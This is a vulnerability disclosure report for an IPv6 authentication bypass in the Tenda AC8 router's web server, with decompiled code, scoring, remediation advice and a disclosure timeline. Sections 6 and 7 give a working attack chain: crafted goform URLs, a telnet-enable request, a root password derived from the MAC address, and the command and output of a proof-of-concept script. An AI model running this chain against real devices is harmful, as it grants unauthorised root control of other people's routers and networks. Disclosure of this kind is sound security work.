# CVE Submission Report: Tenda AC8 IPv6 Authentication Bypass in R7WebsSecurityHandler

## 1. Vulnerability Summary

| Field | Value |
|-------|-------|
| **Title** | IPv6 Authentication Bypass via `strstr` Substring Match in R7WebsSecurityHandler |
| **Vendor** | Shenzhen Tenda Technology Co., Ltd. |
| **Product** | Tenda AC8 V5.0 |
| **Firmware Version** | V16.03.50.11(955) |
| **Affected Component** | `/bin/httpd` (embedded web server) |
| **Affected Function** | `R7WebsSecurityHandler` (address: `0x0043e110`) |
| **Vulnerability Type** | CWE-287: Improper Authentication |
| **Secondary CWE** | CWE-1289: Improper Validation of Unsafe Equivalence in Input |
| **CVSS v3.1 Score** | **8.8 (High)** |
| **CVSS v3.1 Vector** | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Attack Vector** | Adjacent Network (LAN — IPv6 link-local) |
| **Authentication Required** | None |
| **User Interaction** | None |
| **Impact** | Unauthenticated access to all administrative goform handlers, leading to full device compromise (root shell) |

---

## 2. Affected Products

| Product | Firmware Version | Architecture | Status |
|---------|-----------------|--------------|--------|
| Tenda AC8 V5.0 | V16.03.50.11(955)_cn | MIPS32 LE | Confirmed vulnerable |
| Tenda AC8 V5.0 | V16.03.50.11(955)_multi | MIPS32 LE | Confirmed vulnerable |

**Note:** Other Tenda models sharing the `R7WebsSecurityHandler` codebase (e.g., AC6, AC15, AC18) may also be affected. CVE-2021-44971 (AC15/AC5) and CVE-2025-27129 (AC6) describe authentication bypasses that may share the same root cause, but no prior CVE documents this specific mechanism on the AC8.

### Binary Identification

- **File:** `/bin/httpd`
- **SHA256:** `8ace106609bca02860c17d5d251c1286ea21a7760444fbc97066e5c2a99a0a24`
- **Build Path:** `UGWV6.0_11AC_P_AC8V5.0/prod/httpd/11ac/`
- **Type:** ELF 32-bit LSB executable, MIPS, little-endian

---

## 3. Vulnerability Description

The embedded web server (`httpd`) in Tenda AC8 V5.0 firmware contains an authentication bypass vulnerability in the `R7WebsSecurityHandler` function. When a client connects via IPv6, the entire authentication mechanism — including cookie validation, password verification, and session management — is completely skipped.

The function `check_is_ipv6()` determines whether a request originates from an IPv6 client by counting colon characters (`:`) in the client IP string. If two or more colons are found, the request is classified as IPv6 and routed to a code path that performs no authentication checks.

Within this unauthenticated IPv6 code path, the only access control is two `strstr()` substring checks on the full request URL (including the query string):

1. The URL must contain the substring `"goform/"`
2. The URL must contain the substring `"fast_setting_wifi_set"`

Because `strstr()` performs a substring match against the entire URL including query parameters, an attacker can access **any** `/goform/` endpoint by simply appending `?fast_setting_wifi_set=1` to the URL. This renders every administrative handler accessible without authentication.

The IPv6 listener is started **unconditionally** in `websOpenListen()` alongside the IPv4 listener on every boot. No user configuration of IPv6 is required. Since IPv6 link-local addresses (`fe80::`) are automatically assigned to all network interfaces, the attack surface is always present on every device connected to the same LAN segment.

---

## 4. Technical Root Cause

### 4.1 IPv6 Detection — `check_is_ipv6()` (libcommonprod.so, address: 0x0002c338)

```c
bool check_is_ipv6(char *ip_string) {
    int colon_count = 0;
    char *p = ip_string;
    while (*p != '\0' && colon_count < 2) {
        if (*p == ':') colon_count++;
        p++;
    }
    return colon_count > 1;  // true if 2+ colons found
}
```

This function is called with the client's IP address string. Any IPv6 address (e.g., `fe80::ba3a:8ff:fe1b:5750`) contains multiple colons and returns `true`.

### 4.2 Authentication Bypass — `R7WebsSecurityHandler()` (/bin/httpd, address: 0x0043e110)

```c
int R7WebsSecurityHandler(int request) {
    int is_ipv6 = check_is_ipv6(request + 0x30);  // client IP

    if (is_ipv6 != 0) {
        // === IPv6 BRANCH: NO AUTHENTICATION PERFORMED ===
        // No cookie check, no password validation, no session verification

        char *url = /* request URL including query string */;

        if (strstr(url, "goform/") == NULL) {
            websRedirect(request, ipv4_url);    // redirect non-goform
            return 0;
        }
        if (strstr(url, "fast_setting_wifi_set") == NULL) {
            // Return JSON redirect (but see section 4.3)
            websWrite(request, "{\"status\":\"302\"}");
            websDone(request, 200);
            return 0;
        }
        // fast_setting_wifi_set found in URL → ALLOW WITHOUT AUTH
        return 0;
    }

    // === IPv4 BRANCH: Full authentication logic ===
    // Cookie validation, password comparison, session table, CSRF check...
}
```

### 4.3 The `strstr` Substring Match Bypass

The critical flaw is that `strstr(url, "fast_setting_wifi_set")` operates on the **full URL including the query string**. An attacker can reach any goform handler by crafting a URL such as:

```
/goform/telnet?fast_setting_wifi_set=1
/goform/SysToolChangePwd?fast_setting_wifi_set=1
/goform/SetFirewallCfg?fast_setting_wifi_set=1
/goform/fast_setting_wifi_set                      (direct, no trick needed)
```

All of these pass both `strstr` checks and proceed without authentication.

### 4.4 Unconditional IPv6 Listener — `websOpenListen()` (address: 0x00433ed0)

```c
int websOpenListen(int port, int retries) {
    // IPv6 listener — ALWAYS created, no configuration check
    ipv6_socket = socketOpenConnection_plus_v6(NULL, port, websAccept, 0);

    // IPv4 listener
    ipv4_socket = socketOpenConnection(lan_ip, port, websAccept, 0);
    // ...
}
```

The IPv6 socket is created with `AF_INET6` (address family 10) and binds to `in6addr_any`, accepting connections from any IPv6 address on the LAN. There is no configuration gate — the listener is always active.

---

## 5. CVSS v3.1 Scoring Breakdown

**Vector:** `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**Score: 8.8 (High)**

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Adjacent (A) | IPv6 link-local requires same LAN segment |
| Attack Complexity | Low (L) | IPv6 listener always active, link-local always available, no race condition |
| Privileges Required | None (N) | Completely unauthenticated |
| User Interaction | None (N) | No user action required |
| Scope | Unchanged (U) | Compromise of the router (the vulnerable component) |
| Confidentiality | High (H) | Full filesystem read: /etc/shadow, TLS private keys, WiFi credentials |
| Integrity | High (H) | Can change admin password, WiFi config, upload firmware, enable backdoors |
| Availability | High (H) | Can reboot, factory reset, or brick the device |

---

## 6. Exploitation

### 6.1 Prerequisites

- LAN access (same network segment as the router)
- No credentials, no prior authentication, no user interaction required
- No IPv6 configuration required on the router (link-local is always available)

### 6.2 Attack Steps

**Step 1 — Discover the router's IPv6 link-local address:**

```bash
ping6 -c2 ff02::1%eth0
# Router responds from its fe80:: address
```

**Step 2 — Enable telnet via the auth bypass (no credentials needed):**

```
GET /goform/telnet?fast_setting_wifi_set=1 HTTP/1.0
Host: [fe80::ba3a:8ff:fe1b:5750%eth0]
```

This enables `telnetd` on port 23. The `/goform/telnet` handler has no internal password check — the only protection was `R7WebsSecurityHandler`, which is bypassed.

**Step 3 — Login to telnet as root:**

The root password is derived from the device MAC address by the `cnsl_safe` binary:

```
MAC octets [4],[5] → "{mac[4]:02x}1w6lm2p_955{mac[5]:02x}" → base64 encode
```

The MAC can be extracted from the router's EUI-64 link-local address or the NDP neighbor table.

**Step 4 — Full device compromise:**

```
$ telnet fe80::ba3a:8ff:fe1b:5750%eth0
login: root
Password: <MAC-derived password>
# cat /etc/shadow
root:$1$...:0:0:99999:7:::
# id
uid=0(root) gid=0(root)
```

### 6.3 Confirmed Exploitable Endpoints

Any `/goform/` handler is reachable by appending `?fast_setting_wifi_set=1`. Notable targets include:

| Endpoint | Impact | Internal Auth Check |
|----------|--------|-------------------|
| `/goform/telnet` | Starts telnetd → root shell | None |
| `/goform/fast_setting_wifi_set` | Change WiFi SSID/password | None |
| `/goform/SysToolChangePwd` | Change admin password | Checks old password |
| `/goform/SetFirewallCfg` | Modify firewall rules | None |
| `/goform/WifiGuestSet` | Configure guest network | None |
| `/goform/SetSysToolDDNS` | Change DDNS config | None |
| `/goform/ate` | Manufacturing test mode | None (when no password set) |

---

## 7. Proof of Concept

A complete POC script (`poc_ipv6_auth_bypass_password_change.py`) is provided. It automates the full exploitation chain:

```bash
# Full automated exploit: auth bypass → telnet → root shell → shadow dump
python3 poc_ipv6_auth_bypass.py \
    --target fe80::ba3a:8ff:fe1b:5750 \
    --iface eth0 \
    --enable-telnet
```

**Output (redacted):**
```
============================================================
  Tenda Router — IPv6 Authentication Bypass
  Unauthenticated /goform/ access via strstr match
============================================================
  Target: [fe80::ba3a:8ff:fe1b:5750%eth0]:80

[*] Verifying IPv6 authentication bypass...
[+] Auth bypass confirmed — got 200 OK without credentials
[*] Enabling telnet via IPv6 auth bypass...
[+] Telnet enable request sent — 200 OK
[+] Telnet port 23 is OPEN!
[+] MAC from EUI-64 address: b8:3a:08:1b:57:50
[+] Derived root password: <redacted>
[+] ROOT SHELL OBTAINED!

============================================================
  Proof of access — /etc/shadow:
============================================================
  root:$1$<redacted>:0:0:99999:7:::
============================================================

  RESULT: FULL DEVICE COMPROMISE
============================================================
```

The POC requires only Python 3 standard library (no external dependencies).

---

## 8. Impact Assessment

### Direct Impact
- **Unauthenticated root shell access** from the LAN via telnet enable + MAC-derived password
- **Administrative takeover** — change admin password, WiFi credentials, DNS settings
- **Network pivot** — router compromise enables MITM of all LAN traffic, ARP spoofing, DNS hijacking
- **Persistence** — firmware upload capability allows installing persistent backdoors

### Attack Scenarios
1. **Rogue device on LAN** — any compromised IoT device or malicious guest can take over the router
2. **Drive-by from WiFi** — attacker joins WiFi (open guest network or known password), exploits router
3. **Worm propagation** — automated lateral movement across networks with Tenda routers

---

## 9. Remediation Recommendations

1. **Apply authentication to the IPv6 code path** — the IPv6 branch in `R7WebsSecurityHandler` must enforce the same cookie/session/password validation as the IPv4 branch
2. **Replace `strstr` with exact URL path matching** — use `strcmp` or prefix matching against a whitelist of allowed unauthenticated endpoints, operating on the path only (excluding query string)
3. **Disable IPv6 listener when IPv6 is not configured** — do not bind an IPv6 socket unless the user has explicitly enabled IPv6 connectivity
4. **Add authentication to `/goform/telnet`** — the telnet handler should require admin authentication independent of the security handler

---

## 10. Disclosure Timeline

| Date | Event |
|------|-------|
| 2025-03-04 | Vulnerability discovered during firmware security assessment |
| 2025-03-04 | Exploitation confirmed against live Tenda AC8 V5.0 device |
| 2025-03-04 | POC developed and tested |
| 2025-03-04 | Vendor notified via email (security@tenda.com.cn, support@tenda.com.cn) |
| 2025-03-04 | CVE requested via VulDB |

---

## 11. References

- **Firmware:** Tenda AC8 V5.0 V16.03.50.11(955)
- **Binary hash:** `/bin/httpd` SHA256: `8ace106609bca02860c17d5d251c1286ea21a7760444fbc97066e5c2a99a0a24`
- **Related CVEs:**
  - CVE-2021-44971 — Tenda AC15/AC5 authentication bypass (potentially same root cause, different model)
  - CVE-2025-27129 — Tenda AC6 V5.0 HTTP authentication bypass (TALOS-2025-2165, potentially same root cause)
- **CWE References:**
  - CWE-287: Improper Authentication
  - CWE-1289: Improper Validation of Unsafe Equivalence in Input

---

## 12. Discoverer

Andrew Bellini - @DigitalAndrew - andrew@digitalandrew.io

---

*Analysis performed using Wairz firmware security assessment platform with Ghidra decompilation.*
